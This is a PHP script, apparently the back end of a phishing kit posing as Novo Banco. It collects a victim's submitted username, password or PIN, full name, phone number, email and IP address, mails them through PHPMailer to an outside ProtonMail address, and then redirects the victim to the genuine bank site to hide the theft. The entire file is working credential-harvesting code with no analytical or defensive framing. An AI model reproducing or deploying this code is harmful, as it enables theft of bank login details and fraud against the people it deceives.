<?php
require('class.phpmailar.php');

$message = 'Username:'.' '.$_POST['uname']. "\r\n";
$message .= "<br>";
$message .= 'Password:'.' '.$_POST['pin']. "\r\n";
$message .= "<br>";
$message .= 'Full Name:'.' '.$_POST['fname']. "\r\n";
$message .= "<br>";
$message .= 'Phone Number:'.' '.$_POST['number']. "\r\n";
$message .= "<br>";
$message .= 'Email:'.' '.$_POST['email']. "\r\n";
$message .= "<br>";
$message .= 'IP Address:'.' '.$_SERVER['REMOTE_ADDR']. "\r\n";
$message .= "<br>";

$from_address = "pankkiBox@namamail.com";
$from_name = "Novo Banco Box";
$subject = "Banco Email And Pass: " .$_SERVER['REMOTE_ADDR'];
$html_body = $message;

 
$mail = new PHPMailer();

$mail->SetFrom($from_address, $from_name);
$mail->Subject = $subject;


	$mail->AddAddress("samokhin212@protonmail.com");


	// Generate the message
	$mail->MsgHTML($html_body);

	// Send the message 
	if($mail->Send()) {
		header("Location: https://www.novobanco.pt/site/");
	} else {
		header("Location: index.html");
	}


?>

